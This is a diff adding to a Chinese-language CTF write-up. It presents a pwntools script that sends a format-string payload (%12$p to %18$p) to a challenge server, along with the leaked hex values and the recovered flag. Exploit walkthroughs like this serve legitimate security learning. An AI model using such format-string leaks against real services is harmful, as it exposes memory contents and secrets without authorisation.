@@ -125,3 +125,40 @@ Output:
 0096| 0x7fffffffe170 --> 0x7d3f3f3f ('???}')
 0104| 0x7fffffffe178 --> 0x4e5fab838babda00 
 ```
+
+可以看到 %12$p 到 %18$p 是我們要解開的位置，開始撰寫 exploit code。
+> gedit exploit.py
+```
+from pwn import *
+
+ip = "120.114.62.211"
+port = 6127
+
+r = remote(ip, port)
+
+payload = ""
+
+for i in range(12, 19):
+    payload += "%{}$p".format(i)
+
+
+r.sendline(payload)
+out = r.recv()
+
+print(type(out))
+print(out)
+```
+> python3 exploit.py
+```
+[+] Opening connection to 120.114.62.211 on port 6127: Done
+exploit.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.sendline(payload)
+<class 'bytes'>
+b'0x437473726946794d0x346d7230667b46540x676e317254735f740x61336c5f6e34635f0x5479723376335f4b0x5f6e305f476e31680x7d54735f334874'
+MyFirstCTF{f0rm4t_sTr1ng_c4n_l3aK_3v3ryTh1nG_0n_tH3_sT}
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+```
+我們可以看到 **MyFirstCTF{f0rm4t_sTr1ng_c4n_l3aK_3v3ryTh1nG_0n_tH3_sT}**，即找到 flag 了!!
+
+[END]
